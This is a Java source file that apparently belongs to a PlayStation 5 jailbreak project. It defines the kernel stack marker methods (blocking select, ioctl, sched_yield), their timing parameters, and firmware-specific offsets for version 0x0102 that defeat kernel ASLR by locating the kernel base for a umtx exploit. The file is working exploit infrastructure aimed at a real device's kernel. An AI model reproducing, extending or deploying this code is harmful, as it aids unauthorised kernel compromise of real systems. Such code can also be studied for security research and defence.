package org.ps5jb.client.payloads.umtx;

import org.ps5jb.sdk.core.SdkSoftwareVersionUnsupportedException;

public final class KernelStackMarkerMethod {
    public static final KernelStackMarkerMethod BLOCKING_SELECT = new KernelStackMarkerMethod(1, 16, 2, 100);

    // Buffer size for thread marker, it should not be larger than `SYS_IOCTL_SMALL_SIZE`,
    // otherwise `sys_ioctl` will use heap as storage instead of stack.
    // TODO: Not able to get IOCTL method to work...Maybe need to play with MAX_RECLAIM_SYSTEM_CALLS.
    public static final KernelStackMarkerMethod IOCTL = new KernelStackMarkerMethod(2, 128, 32, 250);

    public static final KernelStackMarkerMethod SCHED_YIELD = new KernelStackMarkerMethod(3, 0,2, 100);

    private int id;
    private int markerSize;
    private int searchLoopInvocations;
    private long kernelStackWaitPeriod;

    private long retOffsetFromMarker;
    private long kernelBaseOffsetFromRet;

    private KernelStackMarkerMethod(int id, int markerSize, int searchLoopInvocations, long kernelStackWaitPeriod) {
        this.id = id;
        this.markerSize = markerSize;
        this.searchLoopInvocations = searchLoopInvocations;
        this.kernelStackWaitPeriod = kernelStackWaitPeriod;
    }

    /**
     * Sets offsets in marker methods to defeat ASLR. Not strictly necessary for exploit, but is helpful
     *
     * @param swVer Firmware version
     */
    public static void setSoftwareVersion(int swVer) {
        switch (swVer) {
            case 0x0102:
                SCHED_YIELD.retOffsetFromMarker = -0xB0;
                SCHED_YIELD.kernelBaseOffsetFromRet = -0x00563332;
                BLOCKING_SELECT.retOffsetFromMarker = -0xC0;
                BLOCKING_SELECT.kernelBaseOffsetFromRet = -0x4D4108;
                break;
            default:
                throw new SdkSoftwareVersionUnsupportedException();
        }
    }

    public int getId() {
        return id;
    }

    public int getMarkerSize() {
        return markerSize;
    }

    public int getSearchLoopInvocations() {
        return searchLoopInvocations;
    }

    public long getKernelStackWaitPeriod() {
        return kernelStackWaitPeriod;
    }

    public long getRetOffsetFromMarker() {
        return retOffsetFromMarker;
    }

    public long getKernelBaseOffsetFromRet() {
        return kernelBaseOffsetFromRet;
    }
}
